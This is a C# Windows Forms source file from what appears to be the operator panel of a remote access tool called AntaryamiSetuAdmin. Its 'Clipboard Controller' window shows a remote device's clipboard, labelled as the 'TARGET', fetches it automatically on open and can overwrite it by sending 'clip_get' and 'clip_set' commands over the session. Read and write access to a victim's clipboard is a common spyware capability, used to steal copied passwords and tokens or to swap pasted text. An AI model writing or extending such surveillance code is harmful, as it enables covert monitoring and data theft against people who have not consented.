using System;
using System.Drawing;
using System.Text;
using System.Windows.Forms;

namespace AntaryamiSetuAdmin
{
    public class ClipboardForm : Form
    {
        private readonly ClientSession _session;
        private TextBox? _txtClipboard;
        private Button? _btnRefresh;
        private Button? _btnSet;
        private Label? _lblStatus;

        private readonly Color ColBg = Color.FromArgb(5, 5, 5);
        private readonly Color ColPanel = Color.FromArgb(12, 12, 12);
        private readonly Color ColGreen = Color.FromArgb(0, 255, 64);
        private readonly Color ColCyan = Color.FromArgb(0, 200, 255);
        private readonly Color ColRed = Color.FromArgb(255, 30, 30);
        private readonly Color ColBorder = Color.FromArgb(0, 100, 30);

        public ClipboardForm(ClientSession session)
        {
            _session = session;
            InitializeGUI();

            _session.OnClipboardReceived = HandleClipboardData;

            // Fetch current clipboard automatically on load
            RefreshClipboard();
        }

        private void InitializeGUI()
        {
            this.Text = $"★ CLIPBOARD CONTROLLER // {_session.DeviceName} ★";
            this.Size = new Size(600, 450);
            this.StartPosition = FormStartPosition.CenterScreen;
            this.BackColor = ColBg;
            this.ForeColor = ColGreen;
            this.Font = new Font("Consolas", 10F);
            this.Icon = Program.GetAppIcon();

            TableLayoutPanel layout = new TableLayoutPanel
            {
                Dock = DockStyle.Fill,
                ColumnCount = 1,
                RowCount = 3,
                BackColor = Color.Transparent
            };
            layout.RowStyles.Add(new RowStyle(SizeType.Absolute, 40F)); // Header
            layout.RowStyles.Add(new RowStyle(SizeType.Percent, 100F));  // Text Area
            layout.RowStyles.Add(new RowStyle(SizeType.Absolute, 60F));  // Controls
            this.Controls.Add(layout);

            // Header Panel
            Panel pnlHeader = new Panel { Dock = DockStyle.Fill, BackColor = ColPanel };
            Label lblTitle = new Label { Text = "📋 TARGET LIVE CLIPBOARD STATUS", ForeColor = ColCyan, Location = new Point(10, 12), AutoSize = true, Font = new Font("Consolas", 10F, FontStyle.Bold) };
            pnlHeader.Controls.Add(lblTitle);
            layout.Controls.Add(pnlHeader, 0, 0);

            // Clipboard Text Box
            _txtClipboard = new TextBox
            {
                Multiline = true,
                ScrollBars = ScrollBars.Vertical,
                BackColor = Color.FromArgb(10, 10, 10),
                ForeColor = ColGreen,
                Dock = DockStyle.Fill,
                BorderStyle = BorderStyle.FixedSingle,
                Font = new Font("Consolas", 11F)
            };
            layout.Controls.Add(_txtClipboard, 0, 1);

            // Controls Panel
            Panel pnlControls = new Panel { Dock = DockStyle.Fill, BackColor = ColPanel };
            layout.Controls.Add(pnlControls, 0, 2);

            _btnRefresh = new Button
            {
                Text = "🔄 REFRESH (GET)",
                Location = new Point(10, 15),
                Size = new Size(160, 30),
                BackColor = Color.Transparent,
                ForeColor = ColCyan,
                FlatStyle = FlatStyle.Flat,
                Font = new Font("Consolas", 9F, FontStyle.Bold),
                Cursor = Cursors.Hand
            };
            _btnRefresh.FlatAppearance.BorderColor = ColCyan;
            _btnRefresh.Click += (s, e) => RefreshClipboard();
            pnlControls.Controls.Add(_btnRefresh);

            _btnSet = new Button
            {
                Text = "📤 SET CLIPBOARD (WRITE)",
                Location = new Point(180, 15),
                Size = new Size(200, 30),
                BackColor = Color.Transparent,
                ForeColor = ColGreen,
                FlatStyle = FlatStyle.Flat,
                Font = new Font("Consolas", 9F, FontStyle.Bold),
                Cursor = Cursors.Hand
            };
            _btnSet.FlatAppearance.BorderColor = ColGreen;
            _btnSet.Click += (s, e) => SetClipboard();
            pnlControls.Controls.Add(_btnSet);

            _lblStatus = new Label
            {
                Text = "Idle",
                ForeColor = Color.Gray,
                Location = new Point(390, 22),
                AutoSize = true,
                Font = new Font("Consolas", 9F, FontStyle.Bold)
            };
            pnlControls.Controls.Add(_lblStatus);
        }

        private void RefreshClipboard()
        {
            if (_lblStatus != null)
            {
                _lblStatus.Text = "Retrieving...";
                _lblStatus.ForeColor = ColCyan;
            }
            SendCommandDirect("clip_get");
        }

        private void SetClipboard()
        {
            if (_txtClipboard == null) return;
            string text = _txtClipboard.Text;

            if (_lblStatus != null)
            {
                _lblStatus.Text = "Updating...";
                _lblStatus.ForeColor = ColCyan;
            }
            SendCommandDirect($"clip_set {text}");
        }

        private void HandleClipboardData(string text)
        {
            if (InvokeRequired) { Invoke(new Action(() => HandleClipboardData(text))); return; }

            if (_txtClipboard != null) _txtClipboard.Text = text;
            if (_lblStatus != null)
            {
                _lblStatus.Text = $"Synced: {DateTime.Now:HH:mm:ss}";
                _lblStatus.ForeColor = ColGreen;
            }
        }

        private void SendCommandDirect(string command)
        {
            if (!_session.IsActive) return;

            if (_session.IsHttp)
            {
                DashboardForm.SendHttpCommand(_session.DeviceId, command);
                return;
            }

            try
            {
                byte[] cmdBytes = Encoding.UTF8.GetBytes(command);
                _session.SendPacket(2, cmdBytes);
            }
            catch { }
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            _session.OnClipboardReceived = null;
            base.OnFormClosing(e);
        }
    }
}
